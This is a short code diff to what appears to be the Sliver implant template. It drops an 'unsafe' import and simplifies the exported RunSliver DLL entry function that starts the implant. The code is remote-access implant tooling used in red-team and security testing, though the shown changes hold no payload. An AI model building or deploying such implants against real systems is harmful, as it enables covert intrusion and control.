@@ -19,7 +19,6 @@ package main
 */
 
 // {{if .IsSharedLib}}
-
 import "C"
 
 // {{end}}
@@ -29,10 +28,6 @@ import (
 	"os/user"
 	"runtime"
 	"time"
-
-	// {{if .IsSharedLib}}
-	"unsafe"
-	// {{end}}
 
 	// {{if .Debug}}{{else}}
 	"io/ioutil"
@@ -54,11 +49,7 @@ import (
 
 // RunSliver - Export for shared lib build
 //export RunSliver
-func RunSliver(
-	hinstDLL unsafe.Pointer, // handle to DLL module
-	fdwReason uint32, // reason for calling function
-	lpReserved unsafe.Pointer, // reserved
-) {
+func RunSliver() {
 	main()
 }
 
